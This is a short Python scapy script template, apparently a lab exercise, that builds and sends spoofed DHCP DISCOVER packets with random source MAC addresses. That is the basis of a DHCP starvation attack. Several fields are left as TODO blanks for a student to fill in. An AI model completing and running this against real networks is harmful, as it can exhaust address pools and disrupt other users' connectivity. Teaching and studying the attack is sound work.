#!/usr/bin/python3

from scapy.all import *
from random import randint

dev = "eth0" # change if needed

while (True):
    # TODO: set random MAC Address for spoofed DISCOVER
    src_mac_address = 
    print ("Spoofed MAC:", src_mac_address)

    # TODO: set random xid in the appropriate range
    rand_xid = 

    # TODO: set the type of eth packet according to the spec of DHCP
    ethernet = Ether(dst="ff:ff:ff:ff:ff:ff",src=src_mac_address,type=)

    # TODO: set the dst ip in case of DHCP DISCOVER
    ip = IP(src ="0.0.0.0",dst=)
    udp = UDP (sport=68,dport=67)
    bootp = BOOTP(chaddr=src_mac_address,ciaddr="0.0.0.0",xid=rand_xid)
    dhcp = DHCP(options=[("message-type","discover"),"end"])
    packet = ethernet / ip / udp / bootp / dhcp
    #packet.show() # TODO: uncomment for debug, then comment before execution. 
    sendp(packet, iface=dev)
    input("sent spoofed DHCP-DISCOVER. press Enter to send another one")